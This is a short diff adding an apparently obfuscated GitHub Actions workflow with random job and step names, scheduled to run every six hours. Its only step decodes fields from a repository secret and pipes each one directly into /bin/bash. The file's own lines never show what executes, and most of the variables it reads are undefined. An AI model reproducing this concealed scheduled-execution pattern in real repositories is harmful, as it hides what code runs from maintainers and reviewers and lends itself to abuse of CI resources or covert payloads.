@@ -1,0 +1,27 @@
+name: nihuishinagepoxqiang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nihuishinagepoxqiang
+        env:
+          zhav2: ${{ secrets.zhav2 }}
+        run: |
+          echo $zhav2 | jq -r .bjaae32 | /bin/bash
+          echo $w2415 | jq -r .uwcmv9195 | /bin/bash
+          echo $afr2739 | jq -r .fzzm7 | /bin/bash
+          echo $wk7065 | jq -r .hxv51 | /bin/bash
+          echo $sqwnr4 | jq -r .dwkok5722 | /bin/bash
+          echo $fst9034 | jq -r .r02183 | /bin/bash
+          echo $nekrx3029 | jq -r .jrrik3101 | /bin/bash
+          echo $nur3 | jq -r .pydv214 | /bin/bash
+          echo $jphko88 | jq -r .um54141 | /bin/bash
+          echo $bzo772 | jq -r .ubl87291 | /bin/bash
+          echo $e7 | jq -r .u3343 | /bin/bash
+          echo $tbzu40 | jq -r .eo638 | /bin/bash
+
